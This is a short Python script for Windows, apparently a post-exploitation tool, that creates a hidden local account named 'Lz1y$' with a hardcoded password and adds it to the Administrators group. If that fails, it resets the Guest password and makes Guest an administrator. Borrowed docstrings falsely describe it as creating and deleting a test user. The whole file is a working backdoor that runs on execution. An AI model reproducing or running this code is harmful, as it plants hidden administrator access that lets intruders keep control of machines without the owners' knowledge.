import win32api
import win32net
import win32netcon


verbose_level = 0

server = None # Run on local machine.

def CreateUser():
    "Creates a new test user, then deletes the user"
    a = """#Author: Lz1y
#Blog:http://www.Lz1y.cn\n\n\n\n"""
    print(a)
    testName = "Lz1y$"
    try:
        win32net.NetUserDel(server, testName)
        print("Warning - deleted user before creating it!")
    except win32net.error:
        pass

    d = {}
    d['name'] = testName
    d['password'] = 'P@ssW0rd!!!'
    d['priv'] = win32netcon.USER_PRIV_USER
    d['comment'] = None
    d['flags'] = win32netcon.UF_NORMAL_ACCOUNT | win32netcon.UF_SCRIPT
    try:
        win32net.NetUserAdd(server, 1, d)
        print("CreateUser Successed!")
        print("Username is "+testName)
        LocalGroup(testName)
    except:
        print("Sorry,CreateUser Failed!")
        print("Try to Change Guest!")
        ChangeGuest()

def LocalGroup(uname=None):
    "Creates a local group, adds some members, deletes them, then removes the group"
    level = 3
    if uname is None: uname="Lz1y$"
    if uname.find("\\")<0:
        uname = win32api.GetDomainName() + "\\" + uname
    group = 'Administrators'
    try:
        u={'domainandname': uname}
        win32net.NetLocalGroupAddMembers(server, group, level, [u])
        mem, tot, res = win32net.NetLocalGroupGetMembers(server, group, level)
        print("Add to Administrators Successd!"+'\n'+"Username:Lz1y$\npassword:P@ssW0rd!!!")
    except:
        print("Sorry,Add to Administrators Failed!")

def ChangeGuest():
    level=3
    uname="Guest"
    group = 'Administrators'
    try:
        win32net.NetUserChangePassword(None,uname,"P@ssW0rd!!!","P@ssW0rd!!!")
        u={'domainandname': uname}
        win32net.NetLocalGroupAddMembers(server, group, level, [u])
        mem, tot, res = win32net.NetLocalGroupGetMembers(server, group, level)
        print("Change Guest Successd!"+'\n'+"Username:Guest\npassword:P@ssW0rd!!!")
    except:
        print("Change Guest Failed!Your priv must be System")

CreateUser()